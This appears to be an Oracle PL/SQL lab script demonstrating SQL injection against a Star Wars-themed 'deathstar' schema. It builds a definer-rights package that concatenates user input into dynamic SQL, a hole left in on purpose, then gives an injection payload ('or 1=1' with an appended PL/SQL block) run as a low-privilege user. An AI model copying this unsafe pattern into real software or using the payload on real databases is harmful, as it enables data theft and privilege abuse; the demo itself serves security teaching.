create or replace package room_info authid definer as
  function get_room_id( i_name varchar2 ) return integer;

  function get_room_id_plsql( i_name varchar2 ) return integer;
end;
/

create or replace package body room_info as
  function get_room_id( i_name varchar2 ) return integer
  as
    c_curs sys_refcursor;
    v_row deathstar_rooms%rowtype;
    l_id integer;
    begin
      open c_curs for
        'select * from deathstar_rooms where lower(name) like lower(''%' || i_name || '%'')';

      loop
	      fetch c_curs into v_row;
	      exit when c_curs%notfound or l_id is not null;
	      l_id := v_row.id;
      end loop;

      return l_id;
    end;

  function get_room_id_plsql( i_name varchar2 ) return integer
  as
    l_id integer;
    begin
      execute immediate 'select id from deathstar_rooms where lower(name) like lower(''%' || i_name || '%'')'
        into l_id;

      return l_id;
    end;
end;
/

grant execute on room_info to public;

grant select, update on deathstar.imperial_secrets to public;
revoke select, update on deathstar.imperial_secrets from public;

-- Exploit SQL Injection
--------------------------------------
-- As CONNECT_ONLY:
select deathstar.room_info.GET_ROOM_ID_PLSQL(''') or 1=1; begin dbms_output.put_line(''Test''); end; --') from dual;


with function f( i_stuff varchar2 ) return varchar2
	as
    pragma autonomous_transaction;
  begin
	  return 'Test '||i_stuff;
  end;
select f('blub') from dual;


select 1 from dual where 1 = (
	with function f( i_stuff varchar2 ) return varchar2
		as
	  begin
		  return 'Test '||i_stuff;
	  end;
	select f('blub') from dual
)


